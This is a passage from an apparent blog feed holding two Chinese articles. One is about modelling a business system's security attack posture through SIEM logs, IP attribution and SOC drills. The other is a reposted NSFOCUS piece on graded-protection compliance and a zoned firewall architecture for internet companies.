+&lt;p&gt;所谓深层次溯源分析，针对的主要是一些攻击行为有特点且明显不是自动化行为的攻击，比如上面那个例子。深层的溯源不是要把这个人的户口本全查一遍，然后家里几亩地，地里几头牛这些全都搞出来。之前我在ISC2017的大数据威胁分析论坛上面分享过我个人的观点——真的没必要大费周章把攻击的人直接抓出来，劳民伤财又费力不讨好，甚至没准还会触犯法律。我们需要明白的是攻击者瞄准的目标、攻击的套路和攻击者到底是出于什么样的目的攻击就足够了。&lt;/p&gt;
+
+&lt;p&gt;针对高级的溯源，我们需要采集的数据是：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;攻击者使用的基础设施&lt;/li&gt;
+  &lt;li&gt;攻击者的意图&lt;/li&gt;
+  &lt;li&gt;攻击者的成功率&lt;/li&gt;
+  &lt;li&gt;攻击者的Kill-Chain模型&lt;/li&gt;
+  &lt;li&gt;攻击者瞄准的行业和系统&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;那么实际上高级溯源的结果我们也是有所区分的，比如说某些攻击者满天撒网导出扫描，抓到一个搞一个，这种的攻击者其实是没有价值的，通过网络策略直接ban了就完了。但是如果瞄准特定行业，攻击手段比较黑科技，而且Kill-Chain完整，攻击能力稳准狠，对待这种攻击者我们就应该去重点观察一下了，比如说把他的所有流量通过流量牵引到蜜罐里，观察他的操作。&lt;/p&gt;
+
+&lt;p&gt;其实说到这里，我们研究了所有的攻击者，可以把攻击我们的人都是什么来路摸清楚了。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;（5）SOC团队素质&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;敌人分析完了，我们自己人也得分析分析，分析自己人最好的方法其实就是三个场景：重保、演习和众测。&lt;/p&gt;
+
+&lt;p&gt;出去前一个是有个别地方有需求，其他的两个都是可以找第三方团队去做的，主要目的是为了测试SOC针对外部威胁如何快速准确定位然后消灭威胁。&lt;/p&gt;
+
+&lt;p&gt;根据PDR模型来判断，如果响应时间Rt和检测时间Dt事件越短，同时防御时间Pt可以做到足够的长。攻击者得手的可能性越低。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-写报告&quot;&gt;0x03 写报告&lt;/h2&gt;
+
+&lt;p&gt;笔者个人认为态势感知不是跟x管家、x卫士那种随便打个分数就完了，态势感知的目的是为了给客户提供潜在的攻击行为和应对的策略，应该是完整的建议。态势感知如果要是打分的话这个产品一定是假的，大家不要相信。&lt;/p&gt;
+
+&lt;p&gt;如果输出报告的话，报告中应包含&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;内因分析：威胁建模、安全手段评估、SOC素质、渗透测试和众测等&lt;/li&gt;
+  &lt;li&gt;外因分析：业务系统活跃度、对外ACL、外部情报数据和对攻击者的认知。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;具体怎么写，相信愿意看这篇文章的人应该都比我懂。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;p.s.&lt;/strong&gt; 文章仅代表个人观点，不代表其它的观点。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Q：&lt;/strong&gt;评价业务安全风险的时候，是不是也应该包括业务所处基础环境的安全风险（物理、所处网络环境、操作系统及一些框架之类的）？&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;A：&lt;/strong&gt;首先，您说的这些东西都是包含在内的，这一部分都已经集成到SDL和威胁建模环节，具体的一个业务上线流程请看&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\xss\3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">From : elknot@360corpsec 0x00 写在前面： 0x01 所谓安全攻击态势是什么 0x02 业务系统潜在风险 0x03 写报告 0x00 写在前面： 昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。 0x01 所谓安全攻击态势是什么 跟巨佬的进一步聊天中，我大概明白了甲方的意思：对下属子公司进行考核。其实巨佬自己也知道这个模型偏向于管理而非技术，只是需要技术数据的支撑。那么实际上其实根据我个人的理解就是：客户需要把业务系统所面临的潜在风险罗列出来，并且考核安全部门对于这些潜在风险的解决成果。 那么我们的思路就逐渐清晰了，我们需要了解的也就是业务系统会面临那些潜在的风险和安全部门应对这些风险的技战术手段。 0x02 业务系统潜在风险 但从业务系统的潜在风险来判断的话，很多人第一反应就是日志，换句话说，很多领导要是问安全部门的同事我们系统的潜在风险是什么，经验不足的安全管理人员可能会马上从SIEM中抽取相关的安全日志（如果连SIEM都没有的话，那就是只能亲自动手去所有的安全设备的日志中逐条检索，所以针对大型的系统而言，规模越大SIEM的需求也就越高），然后按照攻击事件的数量排序，最后给出来一个所谓的“业务安全潜在风险分析报告”。但是各位仔细想一下就会发现这份报告实际上是有问题的，首先领导要的是“业务系统潜在风险”，而非是“已经发生的安全事件的统计”，换句话说安全部门提供的报告是领导期望的。那么如何评定业务系统的潜在风险呢？ （1）业务系统活跃指数 首先，针对一个系统而言，业务系统的活跃指数也就是能够被人访问到的几率是一个指标，如果这个业务系统被网络隔离了，也就只有内部的人可以访问的到，那么攻击面就大大减小了。那么如何判断这个系统的活跃指数呢。个人认为PV、UV、搜索引擎排名和Alexa指数这四个数据可以一定程度上来描述业务系统的活跃指数，PV、UV越大、搜索引擎排名越高、Alexa指数越高则说明了该系统被互联网用户访问到的可能性就越大，意味着被攻击的概率也就越高。 上面这张图表示的就是Alexa的指数，指数越高也就是用户访问越频繁。当然这个只是其中的一方面，越活跃不一定代表受攻击的可能越大。 （2）业务安全风险评定 活跃指数只能判断出该业务系统被访问的次数，但是这仅仅是外因。被攻击的可能起决定因素的不是外因而是内因。所谓的内因也就是业务系统资深的原因，比如说用了不安全的框架、中间件存在已知漏洞、管理平台弱口令等等，然而这些问题其实解决起来不是特别的容易，一方面原因是业务系统稳定之后不太可能进行大范围的重构，二是因为开发部门对于安全方面可能不是特别懂，甚至有些大哥直接把测试环境部署到外网上去。 其实这些问题如果企业按部就班的走SDL的话，问题应该不大，因为SDL对于系统的安全开发存在一步威胁建模，就比如下面这张图： STRIDE威胁建模其实是一个很好的评估手段，但是很不幸，很多业务并不会去遵守这一套，这里安全部门就要多跑腿了，要定期对业务系统进行主动的渗透测试和安全监测，保证业务系统不存在可以被恶意利用的漏洞， （3）历史攻击攻击行为比对 这一部分其实就是从SIEM中抽取对应业务系统的安全日志，然后将其统计分类最后按照影响范围统计出来攻击的行为，但是这么做的话还远远不够，因为攻击日志里面有些是成功的有些是失败的，有些是人产生的有些是机器产生的。判断历史攻击行为的时候应当注意以下几点： 确保SIEM中日志的有效性和准确性 统计攻击事件中成功次数与总次数所占的比例 列出所有攻击行为有特点的IP进行简单溯源 对攻击成功的IP进行重点监测并进行针对性溯源 回顾以往众测或者企业SRC收上来的漏洞利用报告 这样的话你将会得到： 一份带有详细数据的事件统计报告 一份发起攻击行为IP的列表 一份成功发起攻击行为IP的列表 N份漏洞利用及分析报告 统计完成之后接下来就可以进行下一环节。 （4）IP溯源及引入情报体系 上面我们得到了一些攻击IP的数据，有些是成功的有些是失败的，这时候我们可以利用外部的威胁情报数据对这些IP进行浅层次或者深层次的溯源，浅层次的溯源主要是针对发起攻击但是失败的，需要收集的信息包括：IP的信誉度、地理位置、绑定的域名、域名注册时间、接入类型、被恶意标记的内容。 这些信息可以帮助我们去判断这些IP是不是肉鸡还是真实的攻击者，举个例子，假设一个IP的是一个荷兰OVH的主机，对我们输出的日志大多数都为扫描、注入类型的攻击，我们只接通过网络策略把这个IP拉黑了就可以了，因为他不是一个真是的攻击者而是一台肉鸡。相反的，如果一个IP攻击的行为包括社工、撞库、恶意漏洞利用、shell管理，并且接入方式是家庭宽带动态IP，那么这个IP我们就应该重点关注，甚至对其进行更深层次的溯源分析。 所谓深层次溯源分析，针对的主要是一些攻击行为有特点且明显不是自动化行为的攻击，比如上面那个例子。深层的溯源不是要把这个人的户口本全查一遍，然后家里几亩地，地里几头牛这些全都搞出来。之前我在ISC2017的大数据威胁分析论坛上面分享过我个人的观点——真的没必要大费周章把攻击的人直接抓出来，劳民伤财又费力不讨好，甚至没准还会触犯法律。我们需要明白的是攻击者瞄准的目标、攻击的套路和攻击者到底是出于什么样的目的攻击就足够了。 针对高级的溯源，我们需要采集的数据是： 攻击者使用的基础设施 攻击者的意图 攻击者的成功率 攻击者的Kill-Chain模型 攻击者瞄准的行业和系统 那么实际上高级溯源的结果我们也是有所区分的，比如说某些攻击者满天撒网导出扫描，抓到一个搞一个，这种的攻击者其实是没有价值的，通过网络策略直接ban了就完了。但是如果瞄准特定行业，攻击手段比较黑科技，而且Kill-Chain完整，攻击能力稳准狠，对待这种攻击者我们就应该去重点观察一下了，比如说把他的所有流量通过流量牵引到蜜罐里，观察他的操作。 其实说到这里，我们研究了所有的攻击者，可以把攻击我们的人都是什么来路摸清楚了。 （5）SOC团队素质 敌人分析完了，我们自己人也得分析分析，分析自己人最好的方法其实就是三个场景：重保、演习和众测。 出去前一个是有个别地方有需求，其他的两个都是可以找第三方团队去做的，主要目的是为了测试SOC针对外部威胁如何快速准确定位然后消灭威胁。 根据PDR模型来判断，如果响应时间Rt和检测时间Dt事件越短，同时防御时间Pt可以做到足够的长。攻击者得手的可能性越低。 0x03 写报告 笔者个人认为态势感知不是跟x管家、x卫士那种随便打个分数就完了，态势感知的目的是为了给客户提供潜在的攻击行为和应对的策略，应该是完整的建议。态势感知如果要是打分的话这个产品一定是假的，大家不要相信。 如果输出报告的话，报告中应包含 内因分析：威胁建模、安全手段评估、SOC素质、渗透测试和众测等 外因分析：业务系统活跃度、对外ACL、外部情报数据和对攻击者的认知。 具体怎么写，相信愿意看这篇文章的人应该都比我懂。 p.s. 文章仅代表个人观点，不代表其它的观点。 Q：评价业务安全风险的时候，是不是也应该包括业务所处基础环境的安全风险（物理、所处网络环境、操作系统及一些框架之类的）？ A：首先，您说的这些东西都是包含在内的，这一部分都已经集成到SDL和威胁建模环节，具体的一个业务上线流程请看</summary></entry><entry><title type="html">互联网企业的等级保护建设之路（转发）</title><link href="http://localhost:4000/2018/10/31/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E7%9A%84%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%BB%BA%E8%AE%BE%E4%B9%8B%E8%B7%AF/" rel="alternate" type="text/html" title="互联网企业的等级保护建设之路（转发）" /><published>2018-10-31T17:16:35+08:00</published><updated>2018-10-31T17:16:35+08:00</updated><id>http://localhost:4000/2018/10/31/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E7%9A%84%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%BB%BA%E8%AE%BE%E4%B9%8B%E8%B7%AF</id><content type="html" xml:base="http://localhost:4000/2018/10/31/%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%81%E4%B8%9A%E7%9A%84%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%BB%BA%E8%AE%BE%E4%B9%8B%E8%B7%AF/">&lt;blockquote&gt;
+  &lt;p&gt;From : http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x00-前言&quot; id=&quot;markdown-toc-0x00-前言&quot;&gt;0x00 前言&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x01-序-互联网企业的兴盛与隐患&quot; id=&quot;markdown-toc-0x01-序-互联网企业的兴盛与隐患&quot;&gt;0x01 序-互联网企业的兴盛与隐患&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x02-起-黑客重点攻击的行业目标&quot; id=&quot;markdown-toc-0x02-起-黑客重点攻击的行业目标&quot;&gt;0x02 起-黑客重点攻击的行业目标&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x03-转-国家信息安全的基本保障制度&quot; id=&quot;markdown-toc-0x03-转-国家信息安全的基本保障制度&quot;&gt;0x03 转-国家信息安全的基本保障制度&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x04-赋-等级保护之于互联网企业的意义&quot; id=&quot;markdown-toc-0x04-赋-等级保护之于互联网企业的意义&quot;&gt;0x04 赋-等级保护之于互联网企业的意义&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x05-比-互联网企业的等级保护解决方案&quot; id=&quot;markdown-toc-0x05-比-互联网企业的等级保护解决方案&quot;&gt;0x05 比-互联网企业的等级保护解决方案&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x06-兴-巨人背后的安全专家&quot; id=&quot;markdown-toc-0x06-兴-巨人背后的安全专家&quot;&gt;0x06 兴-巨人背后的安全专家&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#0x07-终-nsfocus-伴您扬帆远航&quot; id=&quot;markdown-toc-0x07-终-nsfocus-伴您扬帆远航&quot;&gt;0x07 终-NSFOCUS 伴您扬帆远航&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
+
+&lt;p&gt;随着互联网企业的迅猛发展，其自身核心业务安全性的不断提升和行业监管力度的不断加强，如何应对与日俱增的内部需求和外部驱动，本文分析了互联网企业面临的安全威胁及合规监管，以及业内现有的针对该行业的安全建设内容，然后提出了我们基于三级等保的互联网企业信息安全建设思路，从整体上发现并解决互联网行业的安全问题。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-序-互联网企业的兴盛与隐患&quot;&gt;0x01 序-互联网企业的兴盛与隐患&lt;/h2&gt;
+
+&lt;p&gt;1994年，中国通过一条64K的国际专线接入互联网。20年后，互联网带给整个中国经济模式的改变已经影响到了社会的方方面面。可以说，互联网极大地改变了中国，而这种改变仍在继续。&lt;/p&gt;
+
+&lt;p&gt;中国拥有庞大的网民数量，大量的需求被创造，给新的互联网行业形态出现奠定良好基础。其次，中国互联网行业的商业模式日渐成熟。网络广告、搜索引擎、电子商务、网络支付等业务日渐被人接受，各大互联网公司从各自核心领域优势向这几个方面渗透，形成有序竞争，带动互联网行业良性发展。再次，中国网络基础设施的建设、4G/5G互联网的发展、国家政策的扶持规划，均给整个互联网行业创造了一个非常好的前景。&lt;/p&gt;
+
+&lt;p&gt;中国的互联网企业发展迅速，目前已有多家跻身全球互联网公司市值排行榜top10中，像大家熟知的阿里巴巴、京东、腾讯及百度均榜上有名。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/1-300x169.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;相对于传统行业，互联网行业还显得很年轻，在一派欣欣向荣的快速发展背后，互联网行业同时隐藏着让人难以捉摸的巨大的安全风险，由于技术和监管的诸多问题，使得该行业已陷入危机四伏的困境中。&lt;/p&gt;
+
+&lt;p&gt;2016年4月3日，土耳其爆发重大数据泄露事件，近5000W土耳其公民个人信息被黑客打包放置网络上任人下载。为证明被盗数据的真实性，黑客还公布土耳其现任总统埃尔多安的个人信息以作示范。&lt;/p&gt;
+
+&lt;p&gt;2016年7月29日，越南两个机场被黑客攻击，这是越南遭受迄今最严重的黑客攻击事件。黑客通过攻陷机场电子显示屏及广播系统，散发“南海是中国的固有领土”等信息，给机场候机的乘客带来视觉和听觉上的冲击，造成的混乱远超常见的攻击网页行为。&lt;/p&gt;
+
+&lt;p&gt;而在最近披露的一项报道中，俄罗斯黑客成功盗取了2.723亿个帐号，以俄罗斯最受欢迎的电子邮件服务Mail.ru用户为主，此外还有Gmail地址、雅虎以及微软电邮Hotmail用户。数以亿计的数据目前正在“俄罗斯的地下黑市”出售。&lt;/p&gt;
+
+&lt;p&gt;不只是境外企业，国内互联网企业也正在成为最大的受害者。2016上半年，全国互联网企业安全漏洞总量同比增长181.9%。相关人士表示，目前互联网行业存在很大的安全隐患，而且伴随着相当程度的数据泄露风险。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/2-300x169.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-起-黑客重点攻击的行业目标&quot;&gt;0x02 起-黑客重点攻击的行业目标&lt;/h2&gt;
+
+&lt;p&gt;作为一种新生事物，互联网企业起步于民营企业，很多小平台风险意识淡薄，把关注重点放在扩大客户规模、赚取利润上。而技术防护则严重缺失，另外出于成本考虑，大多数企业采用廉价的开源系统，这些系统存在大量风险漏洞，安全性严重缺乏保障，企业数据安全岌岌可危。那么知名大企业又如何呢？随着互联网技术的发展，黑客技术也在升级，企业投入巨大财力和人力研发的系统，同样存在不可预知的问题。因此，也不可避免的遭受黑客的恶意攻击。近年来，知名大企业数据泄露事件频频发生，逐年增多。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/3-300x169.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;据调查统计，黑客攻击互联网企业平台的目的主要为窃取数据，占比高达48%，其次为敲诈勒索和商业竞争。&lt;/p&gt;
+
+&lt;p&gt;通过攻陷大批互联网企业平台，引起系统瘫痪，黑客还能将数据恶意修改、洗劫一空。此外，黑客还可能通过申请账号、篡改数据、冒充投资人进行恶意提现甚至盗取资金。&lt;/p&gt;
+
+&lt;p&gt;企业数据泄露，造成的不只是业务的巨大损失，更为重要的是信誉上的丧失。互联网企业的门户网站作为信誉展示的首要平台，如果因为网站信息泄露、宕机、页面篡改等原因导致用户信任丧失，那么平台也就丢失了本身的信誉，成为无源之水。&lt;/p&gt;
+
+&lt;p&gt;因此，互联网企业如何有效保护信息安全，事关企业生死存亡。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-转-国家信息安全的基本保障制度&quot;&gt;0x03 转-国家信息安全的基本保障制度&lt;/h2&gt;
+
+&lt;p&gt;互联网行业是需要依托互联网的，其核心业务需要IT系统的支撑，因此安全是首当其冲的。而等级保护是国家推行的在Cyber空间安全的强制保护制度，其最终目的是保护信息系统和基础信息网络不受到侵害，保护用户的业务数据和系统的服务功能。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/4-300x56.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从1994年国务院颁布的《中华人民共和国计算机信息系统安全保护条例》（147号令）开始，到今年（2016年）10月份在昆明举办的由公安部网络安全保卫局、中央网信办网络安全协调局、工信部网络安全管理局、国家密码管理局、国家保密局、中国科学院办公厅为指导单位和由公安部第三研究所主办的第五届全国信息安全等级保护技术大会上提出的进入等级保护制度2.0时代为止，等级保护这一项国家政策已经走过逾20个年头，等级保护不仅是对信息安全产品或系统的检测、评估以及定级，更重要的，它是围绕信息安全保障全过程的一项基础性的国家管理制度，是一项基础性和制度性的工作。&lt;/p&gt;
+
+&lt;p&gt;如何帮助互联网企业有效的防范网络入侵、网络拒绝服务攻击以及网络非法监听等恶意网络行为，就有必要了解相应的合规要求。而国家等级保护标准中对于网络安全方面的要求，特别是对网络安全管理、访问控制、入侵防范、网络设备防护、安全审计的相关条款对于和网络密不可分的互联网企业来说，确实有着十分重要且重大的意义。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x04-赋-等级保护之于互联网企业的意义&quot;&gt;0x04 赋-等级保护之于互联网企业的意义&lt;/h2&gt;
+
+&lt;p&gt;在互联网产业不断融合的态势下，互联网跨界融合竞争的趋势越发凸显，线上与线下问题不断交织，新现象、新问题不断涌现，政府的管理也面临前所未有的挑战。因此从2015年，工信部开始进一步加强和改进互联网行业管理，促进互联网企业良性有序发展。”&lt;/p&gt;
+
+&lt;p&gt;信息安全是永远不变的话题，工信部部长苗圩认为应该高度重视我们所面临的严峻安全形势，大力提升网络与信息安全的保障能力。“促进互联网融合发展，安全是基础，更是保障，必须处理好安全与发展的关系，做到协调一致。不断健全互联网行业网络和信息安全机制，持续推进信息安全和体制化建设，推动完善网络安全的法律法规、标准体系，严格落实互联网企业信息安全的责任，加强网络信息安全监管和网络环境的综合治理。”&lt;/p&gt;
+
+&lt;p&gt;除却自身发展面临的网络安全问题，国家有关部门对互联网行业网络安全方面的监管力度也逐年增加。在内部需求和外部监管的双重压力下，加快互联网企业信息安全等级保护建设显得迫在眉睫。&lt;/p&gt;
+
+&lt;p&gt;国家等级保护的核心思想：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;全方位划分安全等级是实施信息安全等级保护的基本条件；&lt;/li&gt;
+  &lt;li&gt;信息系统等级化安全设计是实施信息安全等级保护的基本方法。&lt;/li&gt;
+  &lt;li&gt;信息安全技术和信息安全管理是实现信息系统安全的基础。企业必须根据安全建设目标将需求分析结果进行逐步细化，并转化为信息安全体系建设的总体安全策略，根据登记保护建设的具体要求，可以形成技术层面的安全管理和管理层面的安全策略并通过总体安全策略的落实构建安全技术体系和安全管理体系框架。对于互联网企业来说，实施信息安全等级保护测评能够有效地提高企业信息系统安全建设的整体水平，有效控制企业信息安全建设成本；有利于明确国家、法人和其他组织、公民的信息安全责任，加强企业信息安全管理。&lt;/li&gt;
+  &lt;li&gt;对于企业的信息系统来说，通过等级保护测评可及时发现信息系统安全状况并制定方案进行整改，当信息系统完全达到安全保护能力要求时，信息系统就基本可做到“&lt;strong&gt;进不来、拿不走、改不了、看不懂、跑不了、可审计、打不垮&lt;/strong&gt;”。&lt;/li&gt;
+  &lt;li&gt;对抗能力和恢复能力已然构成了信息系统的安全保护能力。安全保护能力主要表现为信息系统应对威胁的能力，但当信息系统无法阻挡威胁对自身的破坏时，信息系统的恢复能力使系统在一定时间内恢复到原有状态，从而降低负面影响。&lt;/li&gt;
+  &lt;li&gt;对信息安全技术和信息安全管理进行等级划分是信息系统安全等级保护的需要，也是对信息安全技术和信息安全管理进行规范化的需要。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x05-比-互联网企业的等级保护解决方案&quot;&gt;0x05 比-互联网企业的等级保护解决方案&lt;/h2&gt;
+
+&lt;p&gt;按照国家信息安全等级保护的相关标准，互联网企业一般通过第三方测评机构或安全厂商按照如下流程进行等保建设：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/5-300x99.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;同时，按照等级保护中针对技术和管理的不同要求，应持续开展如下工作：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;【保障基础设施安全】保障网络周边环境和物理特性引起的网络设备和线路的持续使用。&lt;/li&gt;
+  &lt;li&gt;【保障网络连接安全】保障网络传输中的安全，尤其保障网络边界和外部接入中的安全。&lt;/li&gt;
+  &lt;li&gt;【保障计算环境的安全】保障操作系统、数据库、服务器、用户终端及相关商用产品的安全。&lt;/li&gt;
+  &lt;li&gt;【保障应用系统安全】保障应用程序层对网络信息的保密性、完整性和信源的真实的保护和鉴别，防止和抵御各种安全威胁和攻击手段，在一定程度上弥补和完善现有操作系统和网络信息系统的安全风险。&lt;/li&gt;
+  &lt;li&gt;【保障数据安全及备份恢复】保障数据完整性、数据保密性、备份和恢复等。&lt;/li&gt;
+  &lt;li&gt;【安全管理体系保障】根据国家有关信息安全等级保护方面的标准和规范要求，建立一套切实可行的安全管理体系，加强安全管理机制。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x06-兴-巨人背后的安全专家&quot;&gt;0x06 兴-巨人背后的安全专家&lt;/h2&gt;
+
+&lt;p&gt;针对互联网企业的信息安全等级保护建设，绿盟科技作为国内安全厂商当仁不让的领军品牌，基于对信息安全的深刻理解，以为互联网客户信息系统构建“等级化的安全体系”为等级保护工作的服务理念，旨在根据等级保护不同等级、不同阶段的业务特性、安全需求及安全应用重点，为互联网客户在等级保护的框架下构建一个安全、可靠、灵活、可持续改进的信息安全体系。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/6-300x169.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于网约车新政的落地实施，交管局明令要求各大网约车平台尽可能快的进行线上业务系统的三级等级保护测评，因为最终测评通过与否关系着该平台营业执照的办理。&lt;/p&gt;
+
+&lt;p&gt;以下以易到租车为例，详细阐述绿盟科技针对互联网用户的信息安全等级保护建设。&lt;/p&gt;
+
+&lt;p&gt;各网约车平台由于自身业务系统的差异，对预约系统应用架构会有不同的设计，但基本的技术构成是类似的，其各部分的功能也相似。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/7-300x169.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;针对易到租车预约APP核心应用的等保三级安全建设，绿盟科技本着“重点防护，纵深防御”的原则，在各服务器区以防火墙作为区域安全边界，为提高预约业务的整体安全性，各区域边界防火墙采用功能与性能兼备的产品，由此在整体布局上形成了“多层异构防火墙”安全架构。从业务功能上考虑，把这种安全架构划分成四个安全区域：互联网接入区、DMZ区（接入WEB服务器、RA服务器）、核心业务区（接入APP服务器、DB服务器）、数据中心内网区。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/8-300x169.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;互联网接入区：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;部署链路分担设备，提供多ISP的互联网接入。&lt;/li&gt;
+  &lt;li&gt;部署流量清洗，防御DDOS攻击&lt;/li&gt;
+  &lt;li&gt;部署外网边界防火墙，实现互联网与DMZ区隔离&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;DMZ区：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;部署WAF，为WEB服务器提供深层次的安全保护；&lt;/li&gt;
+  &lt;li&gt;部署WEB-APP边界防火墙，实现DMZ与核心业务区的隔离；&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;核心业务区&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;APP服务器与DB服务器间可部署防火墙实现访问控制；&lt;/li&gt;
+  &lt;li&gt;部署内网边界防火墙，实现核心业务区与数据中心服务器区间的隔离；&lt;/li&gt;
+  &lt;li&gt;DB服务器旁路接入DAS，实现对数据库的监听与审计&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;数据中心内网区&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;采用“核心 —— 边缘”分区模块化架构，各服务器区围绕网络核心区部署，&lt;/li&gt;
+  &lt;li&gt;各服务器区与网络核心区之间通过防火墙做访问控制；&lt;/li&gt;
+  &lt;li&gt;内网核心旁路接入SAS-H，实现对IP可达的所有设备的单点登录及运维审计&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog.nsfocus.net/wp-content/uploads/2017/01/9-300x169.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;安全技术手段作为支撑，辅以绿盟科技等保咨询服务，为客户搭建信息安全管理与策略体系。如此双管齐下，既能满足国家信息安全等级保护相关政策与标准要求，又可为客户搭建等级化的安全保障体系，在全面防护中突出重点，帮助客户最终通过等保三级测评，不仅提升了安全防护能力，也间接增强了客户的核心竞争力。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x07-终-nsfocus-伴您扬帆远航&quot;&gt;0x07 终-NSFOCUS 伴您扬帆远航&lt;/h2&gt;
+
+&lt;p&gt;互联网行业的三级安全等保技术要求，既有与其它行业要求的共性，又有其自己的特点。&lt;/p&gt;
+
+&lt;p&gt;三级等保对于互联网企业既是一次命题考试，又是一次切实提升企业安全能力的好机会。作为等保技术要求的主要部分——网络安全，因其分散、覆盖面广和难以管理，也是整个等保安全的难点。绿盟科技从网络与安全融合、终端与边界融合、集中与分级融合等多个维度，覆盖了包括结构安全、访问控制、安全审计、边界完整性、入侵防范、恶意代码入侵和设备防护在内的绝大多数技术要求，为互联网客户提供完整的三级等保解决方案方案。&lt;/p&gt;</content><author><name></name></author><summary type="html">From : http://blog.nsfocus.net/construction-grade-protection-internet-enterprises/ 0x00 前言 0x01 序-互联网企业的兴盛与隐患 0x02 起-黑客重点攻击的行业目标 0x03 转-国家信息安全的基本保障制度 0x04 赋-等级保护之于互联网企业的意义 0x05 比-互联网企业的等级保护解决方案 0x06 兴-巨人背后的安全专家 0x07 终-NSFOCUS 伴您扬帆远航 0x00 前言 随着互联网企业的迅猛发展，其自身核心业务安全性的不断提升和行业监管力度的不断加强，如何应对与日俱增的内部需求和外部驱动，本文分析了互联网企业面临的安全威胁及合规监管，以及业内现有的针对该行业的安全建设内容，然后提出了我们基于三级等保的互联网企业信息安全建设思路，从整体上发现并解决互联网行业的安全问题。 0x01 序-互联网企业的兴盛与隐患 